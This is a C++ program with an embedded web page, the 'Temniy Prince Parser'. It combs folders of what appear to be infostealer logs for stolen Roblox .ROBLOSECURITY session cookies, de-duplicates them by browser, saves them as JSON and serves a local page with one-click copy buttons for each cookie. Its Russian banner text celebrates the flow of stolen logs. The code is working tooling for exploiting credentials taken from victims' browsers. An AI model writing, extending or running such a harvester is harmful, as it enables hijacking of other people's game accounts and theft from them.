#include <filesystem>
#include <thread>
#include <iostream>
#include <winsock2.h>
#include <shellapi.h>
#include <Windows.h>
#include <fstream>
#include <vector>
#include <future>
#include <string>
#include <sstream>
#include <syncstream>
#include "httplib.h"
#include <algorithm>
#include <unordered_set>

#define JSON
#define REPEATATOR
//#define TXT

namespace fs = std::filesystem;
std::mutex m;
const fs::path DIRECTORY_ENTRY = fs::current_path(); 
const std::vector<std::string> BROWSERS{"Opera", "Chrome", "Chromium", "Edge", "Firefox", "Opera Air", "Opera GX", "Vivaldi", "Yandex", "Roblox"};
std::unordered_set<std::string> cookies;
size_t countOfFound = 0;

void parseKnownBrowsers(const fs::path p, std::ofstream& out) {
    std::vector<std::future<BOOL>> futures;
    for (auto& b : BROWSERS) {
        if (fs::path bDir = p / b; fs::exists(bDir)) {
            futures.emplace_back(std::async(std::launch::async, [b, bDir, &out]() {
                for (fs::recursive_directory_iterator it(bDir), end; it != end; ++it) {
                    const fs::directory_entry& entry = *it;
                    if (entry.path().extension() == ".txt") {
                        std::fstream reader(entry.path(), std::ios::in);
                        if (reader.is_open()) {
                            std::string line;
                            BOOL isFound = FALSE;
                            while (std::getline(reader, line)) {
                                std::istringstream iss(line);
                                std::string word;
                                while (iss >> word) {
                                    if (word == ".ROBLOSECURITY") {
                                        iss >> word;

#ifdef REPEATATOR
                                        if (!cookies.contains(word)) {
                                            cookies.emplace(word);
#else
                                        {
#endif
                                            isFound = TRUE;
                                            std::string temp = b;
                                            std::transform(temp.begin(), temp.end(), temp.begin(), [](unsigned char c){return toupper(c);});

                                            std::unique_lock<std::mutex> lk(m);
                                            countOfFound++;

                                            std::string filename = entry.path().filename().string();
                                            auto pos = filename.find('.');
                                            if (pos != std::string::npos)
                                                filename.erase(filename.begin() + pos, filename.end());

#ifdef TXT
                                            out << temp << ' ' << '[' << filename << ']' << '\n' << word << "\n\n";
#endif

#ifdef JSON
                                            std::string parent = entry.path().parent_path().filename().string();
                                            auto ppos = parent.find('.');
                                            if (ppos != std::string::npos)
                                                parent.erase(parent.begin() + ppos, parent.end());

                                            out << "{\n\t\"browser\": \"" << parent << ' ' << '[' << filename << ']'
                                                << "\",\n\t\"cookie\": \"" << word << "\"\n},\n";
#endif
#ifdef REPEATATOR
                                        } else {
                                            std::osyncstream(std::cout) << "Repeated cookie was found - skip!\n";
                                            return FALSE;
                                        }
#endif
                                    }
                                }
                            }
                            if (!isFound) {
                                std::osyncstream(std::cout) << entry.path() << " didn't find any .ROBLOSECURITY!\n";
                                return FALSE;
                            } else {
                                std::osyncstream(std::cout) << entry.path() << " have been written!\n";
                            }
                        } else {
                            std::osyncstream(std::cout) << entry.path() << " file doesn't open!\n";
                            return FALSE;
                        }
                    }
                }
                return TRUE;
            }));
        }
    }
    for (auto& f : futures) f.get();
}

void UnknownBrowsersAndPackages(const fs::path p, std::ofstream& out) {
    const fs::path packages = p / "Packages";
    const fs::path unknownBS = p / "Unknown Browsers";
    std::vector<std::future<BOOL>> futures;

    auto processEntry = [&](const fs::directory_entry& entry) {
        std::fstream reader(entry.path(), std::ios::in);
        if (!reader.is_open()) {
            std::osyncstream(std::cout) << entry.path() << " doesn't open!\n";
            return FALSE;
        }

        std::string line;
        BOOL isFound = FALSE;
        while (getline(reader, line)) {
            std::istringstream iss(line);
            std::string word;
            while (iss >> word) {
                if (word == ".ROBLOSECURITY") {
                    iss >> word;

#ifdef REPEATATOR
                    if (!cookies.contains(word)) {
                        cookies.emplace(word);
#else
                    {
#endif
                        isFound = TRUE;

                        std::unique_lock<std::mutex> lk(m);
                        countOfFound++;

                        std::string filename = entry.path().filename().string();
                        auto pos = filename.find('.');
                        if (pos != std::string::npos)
                            filename.erase(filename.begin() + pos, filename.end());

                        std::string parent = entry.path().parent_path().filename().string();
                        auto ppos = parent.find('.');
                        if (ppos != std::string::npos)
                            parent.erase(parent.begin() + ppos, parent.end());

#ifdef TXT
                        out << entry.path().parent_path().filename().string() << ' ' << '[' << filename << ']' << '\n' << word << "\n\n";
#endif

#ifdef JSON
                        out << "{\n\t\"browser\": \"" << parent << ' ' << '[' << filename << ']'
                            << "\",\n\t\"cookie\": \"" << word << "\"\n},\n";
#endif
#ifdef REPEATATOR
                    } else {
                        std::osyncstream(std::cout) << "Repeated cookie was found - skip!\n";
                        return FALSE;
                    }
#endif
                }
            }
        }

        if (isFound)
            std::osyncstream(std::cout) << entry.path() << " have been written!\n";
        else
            std::osyncstream(std::cout) << "Cookie wasn't found at " << entry.path() << '\n';
        return TRUE;
    };

    for (auto& entry : fs::recursive_directory_iterator(packages)) {
        if (entry.path().extension() == ".txt") {
            futures.emplace_back(std::async(std::launch::async, [entry, &processEntry]() {
                return processEntry(entry);
            }));
        }
    }

    for (auto& entry : fs::recursive_directory_iterator(unknownBS)) {
        if (entry.path().extension() == ".txt") {
            futures.emplace_back(std::async(std::launch::async, [entry, &processEntry]() {
                return processEntry(entry);
            }));
        }
    }

    for (auto& f : futures) f.get();
}


BOOL htmlOpen() {
    const char* HTML_CODE = R"HTML(
<style>
    @import url('https://fonts.googleapis.com/css2?family=Bowlby+One+SC&display=swap');
    @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap');
    @import url('https://fonts.googleapis.com/css2?family=Barlow+Condensed:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
    body {
        font-family: Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
        background-color: violet;
        background-image: url('/resources/back.png');
        background-size: cover;
    }
    .centered {
        font-family: 'Bowlby One SC', sans-serif;
        text-align: center;
        font-size: 47px;
        margin-bottom: 5px;
        color:black;
        user-select: none;
    }
    .item {
        /*margin: 10px auto; */
        position: relative;
        padding: 10px;
        border: 2px solid white;
        width: 1870px;
        border-radius: 5px;
        margin-bottom: 10px;
    }
    .cookie-box {
        max-height: 40px;
        max-width: 1865px; /* или любое значение, которое тебе нужно */
        width: 1865px;
        overflow-x: auto; /* вертикальный скролл при переполнении */
        overflow-y: hidden;
        white-space: nowrap;
        background-color: #f0f0f0; /* для визуального отделения */
        padding: 5px;
        border-radius: 3px;
        margin-bottom: 15px;
        font-size: 14px; /* если нужно */
    }
    .red-button {
        height: 50px;
        width: 50px;
        background-color: red;
        background-image: url('/resources/copy.png');
        cursor: pointer;
        align-items: center;
        border-radius: 5px;
        justify-content: center;
        text-align: center;
        display: flex;
        color: black;
        position: absolute;
        top: 10px;
        right: 10px;
        font-size: 20px;
        user-select: none;
        animation: lifted 0.3s ease forwards;
    }
    .red-button.active {
        animation: clicked 0.2s ease forwards;
    }
    @keyframes clicked {
        to {
            transform: scale(0.8);
        }
    }
    @keyframes lifted {
        from {
            transform: scale(0.8);
        }
        to {
            transform: scale(1);
        }
    }
    .text-copied {
        text-align: center;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        color:rgb(0, 0, 0);
        font-size: 100px;
        position: fixed;
        justify-content: center;
        align-items: center;
        display: none;
        user-select: none;
        z-index: 999999;
    }
    .cookie-box-style {
        font-family: 'Bebas Neue', sans-serif;
        font-weight: 400; /* или 700 для bold */
        font-size: 20px;
        color: black;
        user-select: none;
    }
    .prince {
        width: 650px;
        height: 650px;
        background-image: url('/resources/temniyprinc.png');
        position: fixed;
        align-items: center;
        justify-content: center;
        transform: translate(-50%, -50%);
        top: 50%;
        left: 50%;
        z-index: 99999;
        display: none;
    }
    .prince-back {
        position: fixed;
        width: 100vw;
        height: 100vw;
        background-color: black;
        display: none;
        z-index: 9999;
        top: 0;
        left: 0;
    }
    @keyframes blink {
        0% {color: black; }
        50% {color: white; }
        100% {color: black; }
    }
    .blinking {
        animation: blink 0.2s infinite linear;
    }
    @font-face {
        font-family: 'Sigmar';
        src: url('/resources/sigmarcyrillic.otf') format('opentype'),
        url('/resources/1.otf') format('opentype');
        font-weight: normal;
        font-style: normal;
        unicode-range: U+0400-04FF;
    }

    .left-block {
        position: fixed;
        top: 20%;         /* верхняя граница области */
        left: 10%;        /* левая граница области */
        width: 300px;     /* ширина области */
        height: 400px;    /* высота области */
        display: none;
        flex-direction: column;
        justify-content: center; /* по вертикали */
        align-items: center;     /* по горизонтали */
        color: white;
        font-family: 'Sigmar', sans-serif;
        font-size: 100px;
        user-select: none;
        z-index: 50111;
    }

    .left-block span {
        opacity: 0;
        transform: translateY(10px);
        animation: fadeIn 0.35s ease forwards;
    }

    .left-block span:nth-child(1) { animation-delay: 0.25s; }
    .left-block span:nth-child(2) { animation-delay: 0.75s; }


    @keyframes fadeIn {
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    .right-block {
        position: fixed;
        top: 40%;
        left: 75.5%;        /* где начинается правая область */
        width: 300px;
        height: 100px;
        display: none;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        color: white;
        font-family: 'Sigmar', sans-serif;
        font-size: 100px;
        user-select: none;
        z-index: 50111;
    }

    .right-block span {
        opacity: 0;
        transform: translateY(10px);
        animation: fadeIn 0.25s ease forwards;
    }

    .right-block span:nth-child(1) { animation-delay: 1.25s; }
    .right-block span:nth-child(2) { animation-delay: 1.65s; }
    .right-block span:nth-child(3) { animation-delay: 2.35s; }
    .right-block span:nth-child(4) { animation-delay: 2.85s; }
    .right-block span:nth-child(5) { animation-delay: 3.40s; }

    .play-track-button {
        position: fixed;
        align-items: center;
        justify-content: center;
        top: 91%;
        left: 50%;
        transform: translateX(-50%);
        z-index: 99999999;
        width: 450px;
        height: 75px;
        border: 4px solid transparent;
        border-radius: 50px;
        overflow: hidden; /* чтобы псевдоэлемент не вылезал */
    }
    .play-track-button::before {
        content: "";
        position: absolute;
        inset: 0;
        background:
                url("/resources/playbutton.png") center/cover no-repeat padding-box,
                linear-gradient(violet, violet) padding-box,
                linear-gradient(90deg, red, orange, yellow, lime, cyan, blue, violet) border-box;
        background-origin: border-box;
        background-clip: padding-box, border-box;
        background-size: 100% 100%, 300% 100%;
        animation: borderMove 4s linear infinite;
        opacity: 0.75; /* нужная прозрачность */
        z-index: -1; /* чтобы не закрывать span */
    }
    @keyframes borderMove {
        from {
            background-position: 0 0, 0% 0;
        }
        to {
            background-position: 0 0, 100% 0;
        }
    }

    .play-button {
        align-items: center;
        justify-content: center;
        width: 64px;
        height: 64px;
        position: fixed;
        opacity: 100%;
        left: 50%;
        top: 7%;
        transform: translateX(-50%) scale(1);
        background-image: url("/resources/64.png");
        z-index: 999999999;
        cursor: pointer;
        animation: Appear 0.15s ease forwards;
        animation: jumpdown 0.20s ease forwards;
    }
    .pause-button {
        align-items: center;
        justify-content: center;
        width: 64px;
        height: 64px;
        position: fixed;
        opacity: 100%;
        left: 50%;
        top: 7%;
        transform: translateX(-50%) scale(0) translateY(0);
        background-image: url("/resources/pause.png");
        z-index: 999999999;
        cursor: pointer;
        display: none;
        animation: Disappear 0.15s ease forwards;
    }
    .pause-button.active {
        display: flex;
        animation: Appear 0.15s ease forwards;
        animation: jumpbutton 0.20s ease forwards;
    }
    .play-button.active {
        display: none;
        animation: Disappear 0.15s ease forwards;
    }
    @keyframes Disappear {
        from {
            transform: translateX(-50%) scale(1);
        }
        to {
            transform: translateX(-50%) scale(0);
        }
    }
    @keyframes Appear {
        from {
            transform: translateX(-50%) scale(0);
        }
        to {
            transform: translateX(-50%) scale(1);
        }
    }
    @keyframes jumpbutton {
        from {
            transform: translateX(-50%) scale(1) translateY(0);
        }
        to {
            transform: translateX(-50%) scale(1) translateY(-10%);
        }
    }
    @keyframes jumpdown {
        from {
            transform: translateX(-50%) scale(1) translateY(-10%);
        }
        to {
            transform: translateX(-50%) scale(1) translateY(0);
        }
    }

    .playback-line {
        width: 400px;
        height: 8px;
        background: white;
        position: fixed;
        transform: translateX(-50%) scaleX(0);
        transform-origin: center;
        left: 50%;
        top: 82%;
        border-radius: 6px;
        display: flex;
        opacity: 0;
        animation: lineDisapper 0.3s ease forwards;
    }
    .playback-line.active {
        opacity: 1;
        animation: lineAppear 0.2s ease forwards;
    }
    .circle {
        width: 12.5px;
        height: 12.5px;
        border-radius: 6.25px;
        position: fixed;
        transform: translateX(-50%) scale(0);
        left: 7%;
        top: 80%;
        background: white;
        z-index: 999999999;
        opacity: 0;
        transition: none;
        cursor: pointer;
    }

    .circle.active {
        opacity: 1;
        transform: translateX(-50%) scale(1);
        animation: circleAppear 0.25s ease forwards;
        animation-play-state: running;
    }
    .circle.opacitychange {
        opacity: 0;
        transform: translateX(-50%) scale(1);
        animation:
                circleAppear 0.25s ease forwards,
                CircleOpacityChange 0.2s ease forwards ;
    }
    @keyframes CircleOpacityChange {
        from {
            opacity: 1;
            transform: translateX(-50%) scale(1);
        }
        to {
            opacity: 0;
            transform: translateX(-50%) scale(1);
        }
    }
    @keyframes moveCircle {
        from {
            left: 7%;
            opacity: 1;
            transform: translateX(-50%) scale(1);
        }
        to {
            left: 94%;
            opacity: 1;
            transform: translateX(-50%) scale(1);
        }
    }
    @keyframes circleAppear {
        from {
            opacity: 0;
            transform: translateX(-50%) scale(0);
        }
        to {
            opacity: 1;
            transform: translateX(-50%) scale(1);
        }
    }
    @keyframes circleDisAppear {
        from {
            transform: translateX(-50%) scale(1);
        }
        to {
            transform: translateX(-50%) scale(0);
        }
    }
    @keyframes lineAppear  {
        from {
            opacity: 0;
            transform: translateX(-50%) scaleX(0);
        }
        to {
            opacity: 1;
            transform: translateX(-50%) scaleX(1);
        }
    }
    @keyframes lineDisapper {
        from {
            opacity: 1;
            transform: translateX(-50%) scaleX(1);
        }
        to {
            opacity: 0;
            transform: translateX(-50%) scaleX(0);
        }
    }
.blackscreen {
    width: 100vw;
    height: 100vw;
    background: black;
    opacity: 1;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 9999999999999999999;
    animation: fadeOut 3s ease forwards;
}
@keyframes fadeOut {
 to {
     opacity: 0;
 }
}


    .little-black-rectangle {
        display: flex;
        min-height: 50px;
        width: 300px;
        position: fixed;
        transform: translateX(-50%) scale(0);
        background: black;
        top: 85%;
        left: 50%;
        opacity: 1;
        border-radius: 8px;
        flex-direction: column;
        align-items: flex-end;
        word-wrap: break-word;
        box-sizing: border-box;
    }
    .little-black-rectangle.disappear {
        animation: scaleZero 1.5s ease forwards;
    }
    .little-black-rectangle.appear {
        animation: scaleOne 1.5s ease forwards;
    }
    .little-black-rectangle > * {
        min-width: 0;
        max-width: 100%;
        word-wrap: break-word;
        white-space: normal;
    }

    @keyframes scaleZero {
        from {
            transform: translateX(-50%) scale(1);
        }
        to {
            transform: translateX(-50%) scale(0);
        }
    }
    @keyframes scaleOne {
        from {
            transform: translateX(-50%) scale(0);
        }
        to {
            transform: translateX(-50%) scale(1);
        }
    }
    .title {
        font-family: 'More is Less', sans-serif;
        font-size: 15px;
        color: white;
        font-weight: 300;
        font-style: normal;
        position: fixed;
        left: 55%;
        top: 15%;
        overflow-x: auto;
        z-index: 9999999999999999999;
        justify-content: right;
        align-items: center;
        text-align: center;
        display: flex;
        flex-direction: column;
        padding-right: 300px;
        opacity: 0;
        animation: albumDAppear 0.5s ease forwards;
        user-select: none;
    }
    .title.active {
        opacity: 1;
        animation: albumAppear 1s ease forwards;
    }

@font-face {
        font-family: 'More is Less';
        src: url('/resources/11.ttf') format('truetype'),
             url('/resources/12.ttf') format('truetype'),
             url('/resources/13.ttf') format('truetype');
        font-weight: normal;
        font-style: normal;
        unicode-range: U+0400-04FF;
    }

.album-cover {
    width: 43px;
    height: 43px;
    background: black;
    position: fixed;
    background-size: cover;    /* заставляет картинку заполнять блок полностью */
    background-position: center center; /* центрирует картинку внутри блока */
    transform: translateX(-50%);
    top: 7.5%;
    left: 15%;
    bottom: 5px;
    border-radius: 5px;
    z-index: 9999999999999999999;
    opacity: 0;
    animation: albumDAppear 1s ease forwards;
    user-select: none;
}
.album-cover.active {
    opacity: 1;
    animation: albumAppear 0.5s ease forwards;
}
@keyframes albumAppear {
    from {
        opacity: 0;
    }
    to {
        opacity: 1;
    }
}
@keyframes albumDAppear {
    from {
        opacity: 1;
    }
    to {
        opacity: 0;
    }
}

.time-elapsed {
    font-family: 'More is Less', sans-serif;
    font-size: 12px;
    color: white;
    font-weight: 300;
    font-style: normal;
    position: fixed;
    transform: translateX(-50%);
    top: 65%;
    left: 35%;
    z-index: 9999999999999999999;
    opacity: 0;
    animation: albumDAppear 0.25s ease forwards;
    user-select: none;
}

.time-elapsed.active {
    opacity: 1;
    animation: albumAppear 1.25s ease forwards;
}

.mute-unmute-sprite {
    height: 64px;
    width: 64px;
    position: absolute;
    left: 95%;
    top: 5%;
    background-image: url('/resources/mute.png');
    background-size: cover;
    background-position: center center;
    cursor: pointer;
}

.mute-unmute-prince {
    width: 150px;
    height: 150px;
    position: absolute;;
    left: 83%;
    top: 0.25%;
    background-image: url('/resources/PrinceOff.png');
    background-size: cover;
    background-position: center center;
    cursor: pointer;
    border-radius: 30px;
}
</style>
<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" href="/resources/favicon.ico" type="image/x-icon">
         <title>
        Temniy Prince Parser
       </title>
    </head>

    <body>


        <span class="blackscreen"></span>
        <script>
            async function waitForBlackScreen(screen) {
                return new Promise(resolve => {
                   screen.addEventListener('animationend', resolve, {once:true});
                });
            }
            const blackscreen = document.querySelector('.blackscreen');


            (async () => {
                await waitForBlackScreen(blackscreen);
                blackscreen.remove(); // полное удаление из DOM
            })();
        </script>


        <div class="left-block">
        <span>ТЁМНЫЙ</span>
        <span>ПРИНЦ</span>
        </div>

        <div class="right-block">
        <span>ПОКА</span>
        <span>ПАПА</span>
        <span>РАБОТАЛ</span>
        <span>ЛЕТЕЛИ</span>
        <span>ЛОГИ</span>
        </div>

        <div class="centered">Parser Results <br>
        <div class="prince"></div>
        <span id="counter"></span>
        </div>
        <div id="container"></div>
        <div class ="prince-back"></div>
        <div class="text-copied">Cookie copied!</div>
        <div class="mute-unmute-prince"></div>

        <script>
            window.princed = true;
            const princeOffOn = document.querySelector('.mute-unmute-prince');

            princeOffOn.onclick = () => {
                if (princed) {
                    princeOffOn.style.backgroundImage = "url('/resources/PrinceOn.png')";
                    princed = false;
                }
                else if (!princed) {
                    princeOffOn.style.backgroundImage = "url('/resources/PrinceOff.png')";
                    princed = true;
                }
            }
        </script>
        <script>
            const audio = new Audio('/resources/untitled.mp3');
            fetch('output.json')
                .then(res => res.json())
                .then(data => {
                    data.sort((a,b) => {
                       if (a.browser < b.browser) return -1;
                       if (a.browser > b.browser) return 1;
                       return 0;
                    });
                    const container = document.getElementById('container');
                    const counter = document.getElementById('counter');

                    counter.textContent = `Cookies amount: ${data.length}`;
                    data.forEach(item => {

                        const div = document.createElement('div');
                        div.className = 'item';

                        const redButton = document.createElement('span');
                        redButton.className = "red-button";
                        redButton.textContent = `COPY`;
                        redButton.onclick = () => onCopyTextbuttonCopyButton(item.cookie, redButton);

                        const spanBrowser = document.createElement('span');
                        spanBrowser.style.fontFamily = "'Barlow Condensed', sans-serif";
                        spanBrowser.style.fontWeight = "300";
                        spanBrowser.style.fontStyle = "Italic";
                        spanBrowser.style.userSelect = 'none';
                        spanBrowser.style.fontSize = '30px';
                        spanBrowser.textContent = `Browser: ${item.browser}\n`;


                        const spanCookie = document.createElement('span');
                        spanCookie.className = 'cookie-box-style';
                        spanCookie.style.display = 'block';
                        spanCookie.textContent = ` Cookie: `;

                        const cookieBox = document.createElement('div');
                        cookieBox.className = 'cookie-box';
                        cookieBox.textContent = item.cookie;

                        div.appendChild(spanBrowser);
                        div.appendChild(spanCookie);
                        div.appendChild(cookieBox);
                        div.appendChild(redButton);
                        container.appendChild(div);
                    });
                });

            function waitForEnd(audio) {
                return new Promise(resolve => {
                    audio.addEventListener('ended', resolve, {once:true});
                });
            }

            async function run() {
                await audio.play();
                await waitForEnd(audio);
            }
            async function waitforanimation(el) {
                return new Promise(resolve => {
                    el.addEventListener('animationend', resolve, {once:true});
                });
            }
            async function onCopyTextbuttonCopyButton(text, button) {
                if (princed) {
                    if (audio2.muted == false) {
                        muteAudio(audio2);
                    }
                }
                await navigator.clipboard.writeText(text);
                const hub = new Audio('/resources/click.mp3')
                hub.play();
                button.classList.add('active');
                    await waitforanimation(button);
                    button.classList.remove('active');
                    await waitForEnd(hub);


                        const copiedText = document.querySelector('.text-copied');
                        const backgroundPrince = document.querySelector('.prince-back')
                        const princeIMG = document.querySelector('.prince');
                        const leftblock = document.querySelector('.left-block');
                        const rightblock = document.querySelector('.right-block');
                        const playButton = document.querySelector('.play-track-button');



                    if (princed) {
                        playButton.style.opacity = '0';
                    }

                    copiedText.style.display = 'flex';

                    if (princed) {
                        backgroundPrince.style.display = 'flex';
                        princeIMG.style.display = 'flex';
                        leftblock.style.display = 'flex';
                        rightblock.style.display = 'flex';
                    }

                    copiedText.classList.add('blinking');

                    if (princed) {
                    await run();
                    }

                    copiedText.classList.remove('blinking')
                    copiedText.style.display = 'none';

                if (princed) {
                    rightblock.style.display = 'none';
                    leftblock.style.display = 'none';
                    princeIMG.style.display = 'none';
                    backgroundPrince.style.display = 'none';
                    playButton.style.opacity = '1';
                    if (audio2.muted) {
                        unmuteAudio(audio2);
                    }
                }
            };
        </script>
        <div class="play-track-button">
        <span class="play-button"></span>
        <span class="pause-button"></span>
        <span class="playback-line"></span>
        <span class="circle"></span>
        </div>

        <div class="little-black-rectangle">
        <span class="title"></span>
        <span class="album-cover"></span>
        <span class="time-elapsed"></span>
        </div>

        <div class="mute-unmute-sprite"></div>
        <script type="module">
            import { parseBlob } from 'https://cdn.jsdelivr.net/npm/music-metadata-browser@2.5.11/+esm';
            let songIsEnded = true;
            let circleMoving = false;
            let animationFrameID = null;
            let isDragging = false;
            let numOfSongs = 3;
            let timeAnimationFrameID = null;
            let num = Math.floor(Math.random() * numOfSongs + 1);
            const songs = [];
            for (let i = 0; i <= 3; i++) {
                songs.push(`/resources/songs/${i}.mp3`);
            }
            window.audio2 = new Audio(songs[num]);
            let metadata = null;

            const playButton = document.querySelector('.play-button');
            const pauseButton = document.querySelector('.pause-button');
            const playbackLine = document.querySelector('.playback-line');
            const playbackCircle = document.querySelector('.circle');
            const timeText = document.querySelector('.time-elapsed');
            const title = document.querySelector('.title');
            const albumcover = document.querySelector('.album-cover');
            const trackinfo = document.querySelector('.little-black-rectangle');
            playButton.onclick = () => playAudio();
            (async function monitorSongEnd() {
                while (true) {
                    await WaitForSongEnd(audio2); // ждём конца текущей песни
                    console.log('song is over!');

                    pauseAudio();

                    num = Math.floor(Math.random() * numOfSongs + 1);
                    audio2.src = (songs[num]);

                    // при необходимости автоматически запускать новую песню
                    // await playAudio(); // если хочешь автозапуск
                }
            })();
            pauseButton.onclick = () => pauseAudio();


            async function getMetadata(audio) {
                const response = await fetch(audio.src);
                const blob = await response.blob();

                metadata = await parseBlob(blob);
            }

            async function WaitForSongEnd(audio) {
                return new Promise(resolve => {
                    audio.addEventListener("ended", () => {
                        songIsEnded = true;
                        resolve();
                   }, {once:true});
                });
            }

            async function playAudio() {
                songIsEnded = false;
                await audio2.play();
                listenSeconds(audio2);
                playButton.classList.add('active');
                pauseButton.classList.add('active');


                if (!circleMoving) {
                    playbackLine.classList.add('active');
                    playbackCircle.classList.add('active');
                    trackinfo.classList.add('appear');
                    trackinfo.classList.remove('disappear');
                    await getMetadata(audio2);
                    title.textContent = `${metadata.common.title}`;
                    title.classList.add('active');
                    const image = metadata.common.picture[0];
                    const imageBlob = new Blob([image.data], {type: image.format });
                    const imageUrl = URL.createObjectURL(imageBlob);

                    albumcover.style.backgroundImage = `url(${imageUrl})`;
                    albumcover.classList.add('active');
                    timeText.classList.add('active');
                    circleMoving = true;
                }

                playbackCircle.addEventListener('mousedown', (e) => {
                    isDragging = true;
                    if (!audio2.paused) {
                        pauseAudio();
                    }
                    document.body.style.userSelect = 'none';

                    const lineRect = playbackLine.getBoundingClientRect();

                    function onMouseMove(e) {
                        if (!isDragging) return;

                        let x = e.clientX - lineRect.left;
                        x = Math.max(0, Math.min(x, lineRect.width));

                        const percent = x / lineRect.width;
                        playbackCircle.style.left = `${7 + percent * (94 - 7)}%`;
                        audio2.currentTime = audio2.duration * percent;
                    }

                    function onMouseUp(e) {
                        isDragging = false;
                        document.removeEventListener('mousemove', onMouseMove);
                        document.removeEventListener('mouseup', onMouseUp);
                        document.body.style.userSelect = '';
                        playAudio();
                        listenSeconds(audio2);
                        updateCircle();
                    }

                    document.addEventListener('mousemove', onMouseMove);
                    document.addEventListener('mouseup', onMouseUp);
                });
                cancelAnimationFrame(animationFrameID);
                updateCircle();
            }
            function pauseAudio() {
                if (!songIsEnded) {
                    audio2.pause();
                }
                pauseButton.classList.remove('active');
                playButton.classList.remove('active');
                if (songIsEnded) {
                    playbackCircle.classList.remove('active');
                    playbackLine.classList.remove('active');
                    albumcover.classList.remove('active');
                    title.classList.remove('active');
                    timeText.classList.remove('active');
                    trackinfo.classList.add('disappear');
                    trackinfo.classList.remove('appear');
                    circleMoving = false;
                }
                cancelAnimationFrame(animationFrameID);
            }
            function updateCircle() {
                if (!circleMoving) return;

                const progress = audio2.currentTime / audio2.duration;
                playbackCircle.style.left = `${7 + progress * (94-7)}%`;
                if (!audio2.paused) {
                animationFrameID = requestAnimationFrame(updateCircle);
                }
            }
            function formatTime(seconds) {
                const min = Math.floor(seconds / 60);
                const sec = Math.floor(seconds % 60);
                return `${min}:${sec.toString().padStart(2, '0')}`;
            }
            function listenSeconds(audio) {
                cancelAnimationFrame(timeAnimationFrameID);

                function tick() {
                    updateTimeUI();
                    if (!audio.paused && !audio.ended) {
                        timeAnimationFrameID = requestAnimationFrame(tick);
                    }
                }
                tick();
            }
            function updateTimeUI() {
                timeText.textContent = `${formatTime(Math.floor(audio2.currentTime))} / ${formatTime(Math.floor(audio2.duration))}`;
            }
        </script>

        <script>
            const muteunmute = document.querySelector('.mute-unmute-sprite');
            const FADE_STEP = 0.10;
            const STEP_TIME = 50;
            let steptime = null;
            let stepVolume = null;
            var muted = false;

            muteunmute.onclick = () => {
                if (muted) {
                    muteunmute.style.backgroundImage = "url('/resources/mute.png')";
                    muted = false;
                    unmuteAudio(audio2);
                }
                else if (!muted) {
                    muteunmute.style.backgroundImage = "url('/resources/unmute.png')";
                    muted = true;
                    muteAudio(audio2);
                }
            }


            function muteAudio() {
                const fade = setInterval( () => {
                    if (audio2.volume > FADE_STEP) {
                        audio2.volume -= FADE_STEP;
                    } else {
                        audio2.volume = 0;
                        audio2.muted = true;
                        clearInterval(fade);
                    }
                }, STEP_TIME);
            }

            function unmuteAudio() {
                audio2.muted = false;
                const fade = setInterval(() => {
                    if ((audio2.volume + FADE_STEP) <= 1) {
                        audio2.volume += FADE_STEP;
                    } else {
                        audio2.volume = 1;
                        clearInterval(fade);
                    }
                }, STEP_TIME);
            }
        </script>
    </body>
</html>
    )HTML";
    std::ofstream writer(DIRECTORY_ENTRY / "page.html");
    if (!writer.is_open()) {std::cout << "File doesn't open!\n"; return FALSE;}

    writer << HTML_CODE;
    writer.close();

    httplib::Server sv;
    sv.set_mount_point("/resources", "./resources");
    sv.Get("/hi", [](const httplib::Request& req, httplib::Response& res){
        res.set_content("Hello world!", "text/plain");
    });

    sv.Get("/", [](const httplib::Request& req, httplib::Response& res){
        std::ifstream reader("page.html");
        std::stringstream buffer;
        buffer << reader.rdbuf();
        res.set_content(buffer.str(), "text/html");
    });

    sv.Get("/output.json", [](const httplib::Request& req, httplib::Response& res){
        std::ifstream reader("output.json");
        std::stringstream buffer;
        buffer << reader.rdbuf();
        res.set_content(buffer.str(), "application/json");
    });


    ShellExecuteA(NULL, "open", "http://localhost:8080", NULL, NULL, SW_SHOWNORMAL);
    std::cout << "Page has been opened!\nCtrl + C to stop hosting server!\nHaveFUN!!!\n";

    std::cout << "Server Listening on http://localhost:8080\n";
    sv.listen("0.0.0.0", 8080);
    return TRUE;
};

void startParser(const fs::path p) {
#ifdef TXT
    std::cout << "TXT Mode has been choosen!\n";
    std::ofstream outputDir(DIRECTORY_ENTRY / "output.txt");
#endif

#ifdef JSON 
    std::cout << "JSON Mode has been choosen!\nHTML page available!\n";
    std::ofstream outputDir(DIRECTORY_ENTRY / "output.json");
#endif
    if (!outputDir.is_open()) {std::cout << "outputDir doesn't open\n"; return;}
#ifdef JSON
    outputDir << "[\n";
#endif

    parseKnownBrowsers(p, outputDir);
    UnknownBrowsersAndPackages(p, outputDir);
    std::cout << countOfFound << " cookies were found!\n";
#ifdef JSON
    outputDir.seekp(-3, std::ios::cur);
    outputDir << " ";
    outputDir.seekp(0, std::ios::end);
    outputDir << "]";
    outputDir.close();
    std::cout << "] have been written!\n";



    if (htmlOpen()) {std::cout << "HTML opened!\n";}
    #endif
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cout << "Please enter: prog.exe [path to logs folder]\n";
        exit(0);
    }
    const fs::path path = argv[1]; 
    std::cout << "Path choosen -> " << path << '\n';
    std::cout << "Parsing started...\n";

    startParser(path);
}